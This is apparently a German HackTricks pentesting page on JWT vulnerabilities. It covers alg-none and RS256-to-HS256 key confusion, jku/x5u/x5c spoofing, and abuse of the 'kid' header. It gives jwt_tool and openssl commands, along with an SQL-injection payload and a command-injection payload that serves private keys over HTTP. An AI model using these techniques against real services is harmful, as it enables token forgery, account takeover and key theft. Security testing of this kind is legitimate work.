# JWT-Sicherheitsanf√§lligkeiten (Json Web Tokens)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn du an einer **Hacking-Karriere** interessiert bist und das Unhackbare hacken m√∂chtest - **wir stellen ein!** (_flie√üend Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

**Ein Teil dieses Beitrags basiert auf dem gro√üartigen Beitrag:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor des gro√üartigen Tools zum Pentesting von JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Schnelle Erfolge**

F√ºhre [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) im Modus `All Tests!` aus und warte auf gr√ºne Zeilen.
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Wenn Sie Gl√ºck haben, findet das Tool einen Fall, in dem die Webanwendung das JWT falsch √ºberpr√ºft:

![](<../.gitbook/assets/image (935).png>)

Dann k√∂nnen Sie die Anfrage in Ihrem Proxy suchen oder das verwendete JWT f√ºr diese Anfrage mit jwt\_ tool dumpen:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
You can also use the [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) um JWT-Angriffe von Burp auszuf√ºhren.

### Daten manipulieren, ohne etwas zu √§ndern

Sie k√∂nnen einfach die Daten manipulieren und die Signatur unver√§ndert lassen und √ºberpr√ºfen, ob der Server die Signatur √ºberpr√ºft. Versuchen Sie beispielsweise, Ihren Benutzernamen in "admin" zu √§ndern.

#### **Wird das Token √ºberpr√ºft?**

Um zu √ºberpr√ºfen, ob die Signatur eines JWT verifiziert wird:

* Eine Fehlermeldung deutet auf eine laufende √úberpr√ºfung hin; sensible Details in ausf√ºhrlichen Fehlern sollten √ºberpr√ºft werden.
* Eine √Ñnderung der zur√ºckgegebenen Seite deutet ebenfalls auf eine √úberpr√ºfung hin.
* Keine √Ñnderung deutet auf keine √úberpr√ºfung hin; dies ist der Zeitpunkt, um mit der Manipulation der Payload-Anspr√ºche zu experimentieren.

### Ursprung

Es ist wichtig zu bestimmen, ob das Token serverseitig oder clientseitig generiert wurde, indem die Anfragehistorie des Proxys untersucht wird.

* Tokens, die zuerst von der Client-Seite gesehen werden, deuten darauf hin, dass der Schl√ºssel m√∂glicherweise im clientseitigen Code exponiert ist, was eine weitere Untersuchung erforderlich macht.
* Tokens, die serverseitig stammen, deuten auf einen sicheren Prozess hin.

### Dauer

√úberpr√ºfen Sie, ob das Token l√§nger als 24 Stunden h√§lt... vielleicht l√§uft es nie ab. Wenn es ein "exp"-Feld gibt, √ºberpr√ºfen Sie, ob der Server es korrekt behandelt.

### Brute-Force HMAC-Geheimnis

[**Siehe diese Seite.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### √Ñndern Sie den Algorithmus auf None

Setzen Sie den verwendeten Algorithmus auf "None" und entfernen Sie den Signaturteil.

Verwenden Sie die Burp-Erweiterung "JSON Web Token", um diese Schwachstelle auszuprobieren und verschiedene Werte innerhalb des JWT zu √§ndern (senden Sie die Anfrage an Repeater und im Tab "JSON Web Token" k√∂nnen Sie die Werte des Tokens √§ndern. Sie k√∂nnen auch ausw√§hlen, den Wert des "Alg"-Feldes auf "None" zu setzen).

### √Ñndern Sie den Algorithmus von RS256 (asymmetrisch) auf HS256 (symmetrisch) (CVE-2016-5431/CVE-2016-10555)

Der Algorithmus HS256 verwendet den geheimen Schl√ºssel, um jede Nachricht zu signieren und zu verifizieren.\
Der Algorithmus RS256 verwendet den privaten Schl√ºssel, um die Nachricht zu signieren, und verwendet den √∂ffentlichen Schl√ºssel zur Authentifizierung.

Wenn Sie den Algorithmus von RS256 auf HS256 √§ndern, verwendet der Backend-Code den √∂ffentlichen Schl√ºssel als geheimen Schl√ºssel und verwendet dann den HS256-Algorithmus, um die Signatur zu verifizieren.

Dann k√∂nnten wir unter Verwendung des √∂ffentlichen Schl√ºssels und der √Ñnderung von RS256 auf HS256 eine g√ºltige Signatur erstellen. Sie k√∂nnen das Zertifikat des Webservers abrufen, indem Sie dies ausf√ºhren:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Neuer √∂ffentlicher Schl√ºssel im Header

Ein Angreifer bettet einen neuen Schl√ºssel in den Header des Tokens ein, und der Server verwendet diesen neuen Schl√ºssel zur √úberpr√ºfung der Signatur (CVE-2018-0114).

Dies kann mit der "JSON Web Tokens" Burp-Erweiterung durchgef√ºhrt werden.\
(Senden Sie die Anfrage an den Repeater, w√§hlen Sie im Tab f√ºr JSON Web Token "CVE-2018-0114" aus und senden Sie die Anfrage).

### JWKS Spoofing

Die Anweisungen beschreiben eine Methode zur Bewertung der Sicherheit von JWT-Token, insbesondere von solchen, die einen "jku"-Headeranspruch verwenden. Dieser Anspruch sollte auf eine JWKS (JSON Web Key Set)-Datei verweisen, die den √∂ffentlichen Schl√ºssel enth√§lt, der f√ºr die √úberpr√ºfung des Tokens erforderlich ist.

* **Bewertung von Tokens mit "jku"-Header**:
* √úberpr√ºfen Sie die URL des "jku"-Anspruchs, um sicherzustellen, dass sie zur entsprechenden JWKS-Datei f√ºhrt.
* √Ñndern Sie den "jku"-Wert des Tokens, um auf einen kontrollierten Webdienst zu verweisen, der die Beobachtung des Datenverkehrs erm√∂glicht.
* **√úberwachung der HTTP-Interaktion**:
* Die Beobachtung von HTTP-Anfragen an Ihre angegebene URL zeigt die Versuche des Servers an, Schl√ºssel von Ihrem bereitgestellten Link abzurufen.
* Bei der Verwendung von `jwt_tool` f√ºr diesen Prozess ist es wichtig, die Datei `jwtconf.ini` mit Ihrem pers√∂nlichen JWKS-Standort zu aktualisieren, um die Tests zu erleichtern.
* **Befehl f√ºr `jwt_tool`**:
*   F√ºhren Sie den folgenden Befehl aus, um das Szenario mit `jwt_tool` zu simulieren:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Kid-Probleme √úbersicht

Ein optionaler Headeranspruch namens `kid` wird verwendet, um einen bestimmten Schl√ºssel zu identifizieren, was besonders wichtig in Umgebungen ist, in denen mehrere Schl√ºssel zur √úberpr√ºfung der Token-Signatur existieren. Dieser Anspruch hilft bei der Auswahl des geeigneten Schl√ºssels zur √úberpr√ºfung der Signatur eines Tokens.

#### Offenlegung des Schl√ºssels durch "kid"

Wenn der `kid`-Anspruch im Header vorhanden ist, wird empfohlen, das Webverzeichnis nach der entsprechenden Datei oder deren Variationen zu durchsuchen. Wenn beispielsweise `"kid":"key/12345"` angegeben ist, sollten die Dateien _/key/12345_ und _/key/12345.pem_ im Web-Stammverzeichnis gesucht werden.

#### Pfad Traversierung mit "kid"

Der `kid`-Anspruch k√∂nnte auch ausgenutzt werden, um durch das Dateisystem zu navigieren, was m√∂glicherweise die Auswahl einer beliebigen Datei erm√∂glicht. Es ist m√∂glich, die Konnektivit√§t zu testen oder Server-Side Request Forgery (SSRF)-Angriffe durchzuf√ºhren, indem der `kid`-Wert ge√§ndert wird, um gezielt bestimmte Dateien oder Dienste anzusprechen. Das Manipulieren des JWT, um den `kid`-Wert zu √§ndern und gleichzeitig die urspr√ºngliche Signatur beizubehalten, kann mit dem `-T`-Flag in jwt\_tool erreicht werden, wie unten gezeigt:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Durch das Anvisieren von Dateien mit vorhersehbarem Inhalt ist es m√∂glich, ein g√ºltiges JWT zu f√§lschen. Zum Beispiel kann die Datei `/proc/sys/kernel/randomize_va_space` in Linux-Systemen, die den Wert **2** enth√§lt, im `kid`-Parameter mit **2** als symmetrischem Passwort f√ºr die JWT-Generierung verwendet werden.

#### SQL-Injection √ºber "kid"

Wenn der Inhalt des `kid`-Anspruchs verwendet wird, um ein Passwort aus einer Datenbank abzurufen, k√∂nnte eine SQL-Injection erm√∂glicht werden, indem die `kid`-Nutzlast modifiziert wird. Ein Beispiel f√ºr eine Nutzlast, die SQL-Injection verwendet, um den JWT-Signierungsprozess zu √§ndern, ist:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Diese √Ñnderung zwingt die Verwendung eines bekannten geheimen Schl√ºssels, `ATTACKER`, f√ºr die JWT-Signierung.

#### OS-Injection √ºber "kid"

Ein Szenario, in dem der `kid`-Parameter einen Dateipfad angibt, der innerhalb eines Befehlsausf√ºhrungskontexts verwendet wird, k√∂nnte zu Remote Code Execution (RCE)-Schwachstellen f√ºhren. Durch das Injizieren von Befehlen in den `kid`-Parameter ist es m√∂glich, private Schl√ºssel offenzulegen. Ein Beispiel f√ºr eine Nutzlast zur Erreichung von RCE und Schl√ºsseloffenlegung ist:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u und jku

#### jku

jku steht f√ºr **JWK Set URL**.\
Wenn das Token einen ‚Äú**jku**‚Äù **Header**-Anspruch verwendet, dann **pr√ºfen Sie die bereitgestellte URL**. Diese sollte auf eine URL verweisen, die die JWKS-Datei enth√§lt, die den √∂ffentlichen Schl√ºssel zur √úberpr√ºfung des Tokens enth√§lt. Manipulieren Sie das Token, um den jku-Wert auf einen Webdienst zu verweisen, dessen Verkehr Sie √ºberwachen k√∂nnen.

Zuerst m√ºssen Sie ein neues Zertifikat mit neuen privaten und √∂ffentlichen Schl√ºsseln erstellen.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Dann k√∂nnen Sie zum Beispiel [**jwt.io**](https://jwt.io) verwenden, um das neue JWT mit den **erstellten √∂ffentlichen und privaten Schl√ºsseln zu erstellen und den Parameter jku auf das erstellte Zertifikat zu verweisen.** Um ein g√ºltiges jku-Zertifikat zu erstellen, k√∂nnen Sie das urspr√ºngliche herunterladen und die ben√∂tigten Parameter √§ndern.

Sie k√∂nnen die Parameter "e" und "n" aus einem √∂ffentlichen Zertifikat mit folgendem Befehl erhalten:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509-URL. Eine URI, die auf eine Menge von X.509 (einem Zertifikatsformatstandard) √∂ffentlichen Zertifikaten verweist, die im PEM-Format codiert sind. Das erste Zertifikat in der Menge muss dasjenige sein, das verwendet wurde, um dieses JWT zu signieren. Die nachfolgenden Zertifikate signieren jeweils das vorherige, wodurch die Zertifikatskette vervollst√§ndigt wird. X.509 ist in RFC 52807 definiert. Transportsicherheit ist erforderlich, um die Zertifikate zu √ºbertragen.

Versuchen Sie, **diesen Header in eine URL unter Ihrer Kontrolle zu √§ndern** und √ºberpr√ºfen Sie, ob eine Anfrage empfangen wird. In diesem Fall **k√∂nnten Sie das JWT manipulieren**.

Um ein neues Token mit einem von Ihnen kontrollierten Zertifikat zu f√§lschen, m√ºssen Sie das Zertifikat erstellen und die √∂ffentlichen und privaten Schl√ºssel extrahieren:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Dann k√∂nnen Sie beispielsweise [**jwt.io**](https://jwt.io) verwenden, um das neue JWT mit den **erstellten √∂ffentlichen und privaten Schl√ºsseln zu erstellen und den Parameter x5u auf das erstellte Zertifikat .crt zu verweisen.**

![](<../.gitbook/assets/image (956).png>)

Sie k√∂nnen auch beide dieser Schwachstellen **f√ºr SSRFs** ausnutzen.

#### x5c

Dieser Parameter kann das **Zertifikat in base64** enthalten:

![](<../.gitbook/assets/image (1119).png>)

Wenn der Angreifer **ein selbstsigniertes Zertifikat generiert** und ein gef√§lschtes Token mit dem entsprechenden privaten Schl√ºssel erstellt und den Wert des "x5c"-Parameters durch das neu generierte Zertifikat ersetzt und die anderen Parameter, n√§mlich n, e und x5t, √§ndert, w√ºrde das gef√§lschte Token im Wesentlichen vom Server akzeptiert werden.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Eingebetteter √∂ffentlicher Schl√ºssel (CVE-2018-0114)

Wenn das JWT einen √∂ffentlichen Schl√ºssel eingebettet hat, wie im folgenden Szenario:

![](<../.gitbook/assets/image (624).png>)

Mit dem folgenden nodejs-Skript ist es m√∂glich, einen √∂ffentlichen Schl√ºssel aus diesen Daten zu generieren:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Es ist m√∂glich, einen neuen privaten/√∂ffentlichen Schl√ºssel zu generieren, den neuen √∂ffentlichen Schl√ºssel im Token einzubetten und ihn zu verwenden, um eine neue Signatur zu generieren:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Sie k√∂nnen das "n" und "e" mit diesem nodejs-Skript erhalten:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finally, using the public and private key and the new "n" and "e" values you can use [jwt.io](https://jwt.io) to forge a new valid JWT with any information.

### ES256: Offenlegung des privaten Schl√ºssels mit demselben Nonce

Wenn einige Anwendungen ES256 verwenden und dasselbe Nonce zur Generierung von zwei JWTs verwenden, kann der private Schl√ºssel wiederhergestellt werden.

Hier ist ein Beispiel: [ECDSA: Offenlegung des privaten Schl√ºssels, wenn dasselbe Nonce verwendet wird (mit SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

Der JTI (JWT ID) Anspruch bietet einen eindeutigen Identifikator f√ºr ein JWT-Token. Er kann verwendet werden, um zu verhindern, dass das Token wiederverwendet wird.\
Stellen Sie sich jedoch eine Situation vor, in der die maximale L√§nge der ID 4 betr√§gt (0001-9999). Die Anfragen 0001 und 10001 werden dieselbe ID verwenden. Wenn das Backend die ID bei jeder Anfrage erh√∂ht, k√∂nnten Sie dies ausnutzen, um eine **Anfrage wiederzugeben** (es m√ºssen 10000 Anfragen zwischen jeder erfolgreichen Wiederholung gesendet werden).

### JWT Registrierte Anspr√ºche

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Andere Angriffe

**Cross-Service Relay Angriffe**

Es wurde beobachtet, dass einige Webanwendungen auf einen vertrauensw√ºrdigen JWT-Dienst f√ºr die Generierung und Verwaltung ihrer Tokens angewiesen sind. Es wurden F√§lle dokumentiert, in denen ein Token, das f√ºr einen Client vom JWT-Dienst generiert wurde, von einem anderen Client desselben JWT-Dienstes akzeptiert wurde. Wenn die Ausgabe oder Erneuerung eines JWT √ºber einen Drittanbieterdienst beobachtet wird, sollte die M√∂glichkeit untersucht werden, sich mit demselben Benutzernamen/E-Mail-Adresse bei einem anderen Client dieses Dienstes anzumelden. Anschlie√üend sollte versucht werden, das erhaltene Token in einer Anfrage an das Ziel wiederzugeben, um zu sehen, ob es akzeptiert wird.

* Ein kritisches Problem k√∂nnte durch die Akzeptanz Ihres Tokens angezeigt werden, was m√∂glicherweise das Spoofing eines beliebigen Benutzerkontos erm√∂glicht. Es sollte jedoch beachtet werden, dass m√∂glicherweise eine Genehmigung f√ºr umfassendere Tests erforderlich ist, wenn Sie sich bei einer Drittanbieteranwendung anmelden, da dies in einen rechtlichen Graubereich fallen k√∂nnte.

**Ablaufpr√ºfung von Tokens**

Das Ablaufdatum des Tokens wird mit dem "exp" Payload-Anspruch √ºberpr√ºft. Da JWTs oft ohne Sitzungsinformationen verwendet werden, ist eine sorgf√§ltige Handhabung erforderlich. In vielen F√§llen k√∂nnte das Erfassen und Wiedergeben eines anderen Benutzers JWT die Identit√§ts√ºbernahme dieses Benutzers erm√∂glichen. Die JWT RFC empfiehlt, JWT-Wiederholungsangriffe zu mindern, indem der "exp"-Anspruch verwendet wird, um eine Ablaufzeit f√ºr das Token festzulegen. Dar√ºber hinaus ist die Implementierung relevanter Pr√ºfungen durch die Anwendung, um die Verarbeitung dieses Wertes und die Ablehnung abgelaufener Tokens sicherzustellen, entscheidend. Wenn das Token einen "exp"-Anspruch enth√§lt und die Testzeitlimits dies zulassen, wird empfohlen, das Token zu speichern und es nach Ablauf der Zeit erneut wiederzugeben. Der Inhalt des Tokens, einschlie√ülich der Zeitstempelverarbeitung und der Ablaufpr√ºfung (Zeitstempel in UTC), kann mit dem -R-Flag des jwt_tool gelesen werden.

* Ein Sicherheitsrisiko k√∂nnte bestehen, wenn die Anwendung das Token weiterhin validiert, da dies implizieren k√∂nnte, dass das Token niemals ablaufen k√∂nnte.

### Tools

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
